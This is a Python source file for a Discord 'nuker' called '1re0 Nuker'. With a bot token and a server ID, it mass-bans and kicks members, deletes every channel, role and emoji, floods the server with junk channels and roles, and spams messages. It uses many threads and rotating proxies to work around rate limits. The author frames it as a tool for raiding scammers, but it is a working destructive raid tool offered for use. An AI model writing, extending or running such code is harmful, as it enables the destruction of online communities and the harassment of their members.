import threading, webbrowser, discord, random, httpx, json, time, os; from discord.ext import commands;from itertools import cycle

VERSION = '1.0.0'

__intents__ = discord.Intents.default()
__intents__.members = True
__proxies__, __client__, __config__, __threads__= cycle(open("proxies.txt", "r").read().splitlines()), commands.Bot(command_prefix="+", help_command=None, intents=__intents__), json.load(open("config.json", "r", encoding="utf-8")), 45
os.system("clear")

Reo_art = """

\033[38;5;196m░░███╗░░██████╗░███████╗░█████╗░  ███╗░░██╗██╗░░░██╗██╗░░██╗███████╗██████╗░
\033[38;5;196m░████║░░██╔══██╗██╔════╝██╔══██╗  ████╗░██║██║░░░██║██║░██╔╝██╔════╝██╔══██╗
\033[38;5;196m██╔██║░░██████╔╝█████╗░░██║░░██║  ██╔██╗██║██║░░░██║█████═╝░█████╗░░██████╔╝
\033[38;5;196m╚═╝██║░░██╔══██╗██╔══╝░░██║░░██║  ██║╚████║██║░░░██║██╔═██╗░██╔══╝░░██╔══██╗
\033[38;5;196m███████╗██║░░██║███████╗╚█████╔╝  ██║░╚███║╚██████╔╝██║░╚██╗███████╗██║░░██║
\033[38;5;196m╚══════╝╚═╝░░╚═╝╚══════╝░╚════╝░  ╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝ 

                                       \033[38;5;196mYeah You Will Deserve it .\033[0m
                              \033[0m\033[38;5;135m═══════════════════════════════════         
                         \033[0m\033[38;5;99m═════════════════════════════════════════════\033[0m
"""
options = """
              \033[38;5;171m╚╦╗                                                             ╔╦╝
         \033[38;5;196m╔═════╩══════════════════╦\033[38;5;135m═════════════════════════╦\033[38;5;15m══════════════════╩═════╗
         \033[38;5;196m╩ (1) < Ban Members      ║\033[38;5;135m (5) < Create Roles      ║\033[38;5;15m (9)  < Spam Channels   ╩
           \033[38;5;196m(2) < Kick Members     ║\033[38;5;135m (6) < Delete Channels   ║\033[38;5;15m (10) < Check Updates      
           \033[38;5;196m(3) < Prune Members    ║\033[38;5;135m (7) < Delete Roles      ║\033[38;5;15m (11) < Credits        
         \033[38;5;196m╦ (4) < Create Channels  ║\033[38;5;135m (8) < Delete Emojis     ║\033[38;5;15m (12) < Exit            ╦
         \033[38;5;171m╚═════╦══════════════════╩═════════════════════════╩══════════════════╦═════╝
              \033[38;5;171m╔╩╝                                                             ╚╩╗\033[0m
"""


class Reo:
    def __init__(self):
        self.proxy = "http://" + next(__proxies__) if __config__["proxy"] == True else None
        self.session = httpx.Client(proxies=self.proxy)
        self.version = cycle(['v10', 'v9'])
        self.banned = []
        self.kicked = []
        self.channels = []
        self.roles = []
        self.emojis = []
        self.messages = []

 
    def execute_ban(self, guildid: str, member: str, token: str):
        payload = {
            "delete_message_days": random.randint(0, 7)
        }
        while True:
            response = self.session.put(f"https://discord.com/api/{next(self.version)}/guilds/{guildid}/bans/{member}", headers={"Authorization": f"Bot {token}"}, json=payload)
            if response.status_code in [200, 201, 204]:
                print("{}({}+{}) Banned {}{}".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", member))
                self.banned.append(member)
                break
            elif "retry_after" in response.text:
                time.sleep(response.json()['retry_after'])
            elif "Missing Permissions" in response.text:
                print("{}({}!{}) Missing Permissions {}{}".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", member))
                break
            elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
                print("{}({}!{}) You're being excluded from discord API {}{}".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m"))
                break
            elif "Max number of bans for non-guild members have been exceeded." in response.text:
                print("{}({}!{}) Max number of bans for non-guild members have been exceeded".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m"))
                break
            else:
                print("{}({}-{}) Failed to ban {}{}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", "\x1b[31m", member))
                break
            
    
    def execute_kick(self, guildid: str, member: str, token: str):
        while True:
            response = self.session.delete(f"https://discord.com/api/{next(self.version)}/guilds/{guildid}/members/{member}", headers={"Authorization": f"Bot {token}"})
            if response.status_code in [200, 201, 204]:
                print("{}({}+{}) Kicked {}{}".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", member))
                self.kicked.append(member)
                break
            elif "retry_after" in response.text:
                print("{}({}!{}) Ratelimited. Delayed {}{}{}s".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", response.json()['retry_after'], "\x1b[0m"))
                time.sleep(float(response.json()['retry_after']))
            elif "Missing Permissions" in response.text:
                print("{}({}!{}) Missing Permissions {}{}".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", member))
                break
            elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
                print("{}({}!{}) You're being excluded from discord API {}{}".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m"))
                break
            else:
                print("{}({}-{}) Failed to kick {}{}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", "\x1b[31m", member))
                break
            
    
    def execute_prune(self, guildid: str, days: int, token: str):
        payload = {
            "days": days
        }
        response = self.session.post(f"https://discord.com/api/v9/guilds/{guildid}/prune", headers={"Authorization": f"Bot {token}"}, json=payload)
        if response.status_code == 200:
            print("{}({}+{}) Pruned {}{}{} members".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", response.json()['pruned'], "\x1b[0m"))
        elif "Max number of prune requests has been reached. Try again later" in response.text:
            print("{}({}!{}) Max number of prune reached. Try again in {}s".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", response.json()['retry_after']))
        elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
            print("{}({}!{}) You're being temporarly excluded from discord API".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m"))
        else:
            print("{}({}-{}) Failed to prune {}{}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", "\x1b[31m", guildid))
            
            
    def execute_crechannels(self, guildid: str, channelsname: str, type: int, token: str):
        payload = {
            "type": type,
            "name": channelsname,
            "permission_overwrites": []
        }
        channelsname = channelsname.replace(" ", "-")
        while True:
            response = self.session.post(f"https://discord.com/api/{next(self.version)}/guilds/{guildid}/channels", headers={"Authorization": f"Bot {token}"}, json=payload)
            if response.status_code == 201:
                print("{}({}+{}) Created {}#{}".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", channelsname))
                self.channels.append(1)
                break
            elif "retry_after" in response.text:
                print("{}({}!{}) Ratelimited. Delayed {}{}{}s".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", response.json()['retry_after'], "\x1b[0m"))
                time.sleep(float(response.json()['retry_after']))
            elif "Missing Permissions" in response.text:
                print("{}({}!{}) Missing Permissions {}#{}".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", channelsname))
                break
            elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
                print("{}({}!{}) You're being temporarly excluded from discord API".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m"))
                break
            else:
                print("{}({}-{}) Failed to create {}#{}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", "\x1b[31m", channelsname))
                break
            
            
    def execute_creroles(self, guildid: str, rolesname: str, token: str):
        colors = random.choice([0x0000FF, 0xFFFFFF, 0xFF0000, 0x00FF00, 0x0000FF, 0xFFFF00, 0x00FFFF, 0xFF00FF, 0xC0C0C0, 0x808080, 0x800000, 0x808000, 0x008000, 0x800080, 0x008080, 0x000080])
        payload = {
            "name": rolesname,
            "color": colors
        }
        while True:
            response = self.session.post(f"https://discord.com/api/{next(self.version)}/guilds/{guildid}/roles", headers={"Authorization": f"Bot {token}"}, json=payload)
            if response.status_code == 200:
                print("{}({}+{}) Created {}@{}".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", rolesname))
                self.roles.append(1)
                break
            elif "retry_after" in response.text:
                print("{}({}!{}) Ratelimited. Delayed {}{}{}s".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", response.json()['retry_after'], "\x1b[0m"))
                time.sleep(float(response.json()['retry_after']))
            elif "Missing Permissions" in response.text:
                print("{}({}!{}) Missing Permissions {}@{}".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", rolesname))
                break
            elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
                print("{}({}!{}) You're being temporarly excluded from discord API".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m"))
                break
            else:
                print("{}({}-{}) Failed to create {}@{}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", "\x1b[31m", rolesname))
                break
            
    
    def execute_delchannels(self, channel: str, token: str):
        while True:
            response = self.session.delete(f"https://discord.com/api/{next(self.version)}/channels/{channel}", headers={"Authorization": f"Bot {token}"})
            if response.status_code == 200:
                print("{}({}+{}) Deleted {}{}".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", channel))
                self.channels.append(channel)
                break
            elif "retry_after" in response.text:
                print("{}({}!{}) Ratelimited. Delayed {}{}{}s".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", response.json()['retry_after'], "\x1b[0m"))
                time.sleep(float(response.json()['retry_after']))
            elif "Missing Permissions" in response.text:
                print("{}({}!{}) Missing Permissions {}{}".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", channel))
                break
            elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
                print("{}({}!{}) You're being temporarly excluded from discord API".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m"))
                break
            else:
                print("{}({}-{}) Failed to delete {}{}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", "\x1b[31m", channel))
                break
            
            
    def execute_delroles(self, guildid: str, role: str, token: str):
        while True:
            response = self.session.delete(f"https://discord.com/api/{next(self.version)}/guilds/{guildid}/roles/{role}", headers={"Authorization": f"Bot {token}"})
            if response.status_code == 204:
                print("{}({}+{}) Deleted {}{}".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", role))
                self.roles.append(role)
                break
            elif "retry_after" in response.text:
                print("{}({}!{}) Ratelimited. Delayed {}{}{}s".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", response.json()['retry_after'], "\x1b[0m"))
                time.sleep(float(response.json()['retry_after']))
            elif "Missing Permissions" in response.text:
                print("{}({}!{}) Missing Permissions {}{}".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", role))
                break
            elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
                print("{}({}!{}) You're being temporarly excluded from discord API".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m"))
                break
            else:
                print("{}({}-{}) Failed to delete {}{}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", "\x1b[31m", role))
                break
            
    def execute_delemojis(self, guildid: str, emoji: str, token: str):
        while True:
            response = self.session.delete(f"https://discord.com/api/{next(self.version)}/guilds/{guildid}/emojis/{emoji}", headers={"Authorization": f"Bot {token}"})
            if response.status_code == 204:
                print("{}({}+{}) Deleted {}{}".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", emoji))
                self.emojis.append(emoji)
                break
            elif "retry_after" in response.text:
                print("{}({}!{}) Ratelimited. Delayed {}{}{}s".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", response.json()['retry_after'], "\x1b[0m"))
                time.sleep(float(response.json()['retry_after']))
            elif "Missing Permissions" in response.text:
                print("{}({}!{}) Missing Permissions {}{}".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", emoji))
                break
            elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
                print("{}({}!{}) You're being temporarly excluded from discord API".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m"))
                break
            else:
                print("{}({}-{}) Failed to delete {}{}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", "\x1b[31m", emoji))
                break
            
    
    def execute_massping(self, channel: str, content: str, token: str):
        while True:
            response = self.session.post(f"https://discord.com/api/{next(self.version)}/channels/{channel}/messages", headers={"Authorization": f"Bot {token}"}, json={"content": content})
            if response.status_code == 200:
                print("{}({}+{}) Spammed {}{}{} in {}{}".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", content, "\x1b[0m", "\x1b[38;5;21m", channel))
                self.messages.append(channel)
                break
            elif "retry_after" in response.text:
                print("{}({}!{}) Ratelimited. Delayed {}{}{}s".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", response.json()['retry_after'], "\x1b[0m"))
                time.sleep(float(response.json()['retry_after']))
            elif "Missing Permissions" in response.text:
                print("{}({}!{}) Missing Permissions {}{}".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", channel))
                break
            elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
                print("{}({}!{}) You're being temporarly excluded from discord API".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m"))
                break
            else:
                print("{}({}-{}) Failed to spam {}{}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", "\x1b[31m", channel))
                break

    
    def menu(self):
        os.system(f"Authenticated as: {__client__.user.name}#{__client__.user.discriminator}")
        time.sleep(1)
        os.system("clear")
        print(Reo_art + options + "\n")
        ans = input("\033[38;5;135m(1re0) Option: ".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m")) 
        
        if ans in ["1", "01"]:
            scrape = input("{}({}1re0{}) Fetch IDs [Y/N]{}:{} ".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m"))
            if scrape.lower() == "y":
                try:
                    guild = __client__.get_guild(int(guildid))
                    with open("fetched/members.txt", "w") as a:
                        for member in guild.members:
                            a.write("{}{}".format(member.id, "\n"))
                except: pass
            else:
                pass
            self.banned.clear()
            members = open("fetched/members.txt", "r").read().splitlines()
            for member in members:
                t = threading.Thread(target=self.execute_ban, args=(guildid, member, token))
                t.start()
                while threading.active_count() >= __threads__:
                    t.join()
                    
            time.sleep(3)
            print("{}({}1re0{}) Banned {}/{}".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", len(self.banned), len(members)))
            time.sleep(1.5)
            self.menu()
            
        elif ans in ["2", "02"]:
           
            self.kicked.clear()
            members = open("fetched/members.txt", "r").read().splitlines()
            for member in members:
                t = threading.Thread(target=self.execute_kick, args=(guildid, member, token))
                t.start()
                while threading.active_count() >= __threads__:
                    t.join()
            
            time.sleep(3)
            print("{}({}1re0{}) Kicked {}/{}".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", len(self.kicked), len(members)))
            time.sleep(1.5)
            self.menu()
            
        elif ans in ["3", "03"]:
            print("\033[91m This command is stopped. We are sorry about that.")
            time.sleep(3.5)
            self.menu()
            
        elif ans in ["4", "04"]:
            type = input("{}({}1re0{{}) Channels Type ['t', 'v']{}:{} ".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m"))
            type = 2 if type == "v" else 0
            amount = int(input("{}({}1re0{{}) Amount{}:{} ".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m")))
            self.channels.clear()
            for i in range(amount):
                t = threading.Thread(target=self.execute_crechannels, args=(guildid, random.choice(__config__["nuke"]["channels_name"]), type, token))
                t.start()
                while threading.active_count() >= __threads__:
                    t.join()
                
            time.sleep(3)
            print("{}({}1re0{{}) Created {}/{} channels".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", len(self.channels), amount))
            time.sleep(1.5)
            self.menu()
            
        elif ans in ["5", "05"]:
            amount = int(input("{}({}1re0{{}) Amount{}:{} ".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m")))
            self.roles.clear()
            for i in range(amount):
                t = threading.Thread(target=self.execute_creroles, args=(guildid, random.choice(__config__["nuke"]["roles_name"]), token))
                t.start()
                while threading.active_count() >= __threads__:
                    t.join()
                
            time.sleep(3)
            print("{}({}1re0{{}) Created {}/{} roles".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", len(self.roles), amount))
            time.sleep(1.5)
            self.menu()
            
        elif ans in ["6", "06"]:
            self.channels.clear()
            channels = self.session.get(f"https://discord.com/api/v9/guilds/{guildid}/channels", headers={"Authorization": f"Bot {token}"}).json()
            for channel in channels:
                t = threading.Thread(target=self.execute_delchannels, args=(channel['id'], token))
                t.start()
                while threading.active_count() >= __threads__:
                    t.join()
                
            time.sleep(3)
            print("{}({}1re0{{}) Deleted {}/{} channels".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", len(self.channels), len(channels)))
            time.sleep(1.5)
            self.menu()
            
        elif ans in ["7", "07"]:
            self.roles.clear()
            roles = self.session.get(f"https://discord.com/api/v9/guilds/{guildid}/roles", headers={"Authorization": f"Bot {token}"}).json()
            for role in roles:
                t = threading.Thread(target=self.execute_delroles, args=(guildid, role['id'], token))
                t.start()
                while threading.active_count() >= __threads__:
                    t.join()
                
            time.sleep(3)
            print("{}({}1re0{{}) Deleted {}/{} roles".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", len(self.roles), len(roles)))
            time.sleep(1.5)
            self.menu()
            
        elif ans in ["8", "08"]:
            self.emojis.clear()
            emojis = self.session.get(f"https://discord.com/api/v9/guilds/{guildid}/emojis", headers={"Authorization": f"Bot {token}"}).json()
            for emoji in emojis:
                t = threading.Thread(target=self.execute_delemojis, args=(guildid, emoji['id'], token))
                t.start()
                while threading.active_count() >= __threads__:
                    t.join()
                    
            time.sleep(3)
            print("{}({}1re0{{}) Deleted {}/{} emojis".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", len(self.emojis), len(emojis)))
            time.sleep(1.5)
            self.menu()
            
        elif ans in ["9", "09"]:
            self.messages.clear(); self.channels.clear()
            amount = int(input("{}({}1re0{{}) Amount{}:{} ".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m")))
            channels = self.session.get(f"https://discord.com/api/v9/guilds/{guildid}/channels", headers={"Authorization": f"Bot {token}"}).json()
            for channel in channels: self.channels.append(channel['id'])
            channelz = cycle(self.channels)
            for i in range(amount):
                t = threading.Thread(target=self.execute_massping, args=(next(channelz), random.choice(__config__["nuke"]["messages_content"]), token))
                t.start()
                while threading.active_count() >= __threads__ - 15:
                    t.join()
                    
            time.sleep(3)
            print("{}({}1re0{{}) Spammed {}/{} messages".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", len(self.messages), amount))
            time.sleep(1.5)
            self.menu()
            
        elif ans == "10":
            print("You are already using the latest version")
            time.sleep(2.5)
            self.menu()
    
        
        elif ans == "11":
            print("-    This is a fastest Tool For Raid - Hacking Scammers and others . - Discord : @h5dt\n- Press any key to return.")
            input("")
            self.menu()
        
        elif ans == "12":
            print("{}({}1re0{{})  Thanks You All 4 Using 1re0 Nuker .".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m"))
            time.sleep(1.5)
            os._exit(0)
            
    
@__client__.event
async def on_ready():
    print("{}({}1re0{}) Authenticated as{}: {}{}".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", f"{__client__.user.name}#{__client__.user.discriminator}"))
    time.sleep(1.5)
    Reo().menu()
    

if __name__ == "__main__":
    try:
        print("\x1b[93m" + """
            Welcome to 1re0 Nuker!
            
            This python/code for Destroy Scammers - Others . 
            By 1re0 - Reo
        """ + "\x1b[0m")
        token = input("{}({}{}1re0{}) Enter Your Bot token: ".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m"))
        guildid = input("{}({}{}1re0{}) Enter The Server ID: ".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m"))
        __client__.run(token, bot=True)
    except Exception as e:
        print("{}({}-{}) {}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", e))
        time.sleep(1.5)
        os._exit(0)
